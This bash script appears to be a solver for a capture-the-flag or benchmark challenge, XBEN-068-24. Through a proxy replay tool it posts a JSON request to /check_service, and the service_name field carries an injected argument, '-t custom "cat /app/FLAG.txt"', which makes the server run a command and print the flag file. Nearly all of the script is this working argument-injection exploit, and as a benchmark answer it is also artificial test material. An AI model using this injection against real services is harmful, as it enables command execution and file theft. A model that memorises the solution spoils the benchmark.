#!/usr/bin/env bash
# XBEN-068-24 — argument injection. Proxy-mode twin. service_name is spliced
# into a command line unquoted, so `-t custom "cat /app/FLAG.txt"` adds options
# that make the tool run the command and echo the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben068p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/check_service' \
  --set 'header.Content-Type=application/json' \
  --set 'json.service_name=-t custom "cat /app/FLAG.txt"' >/dev/null
print_flag
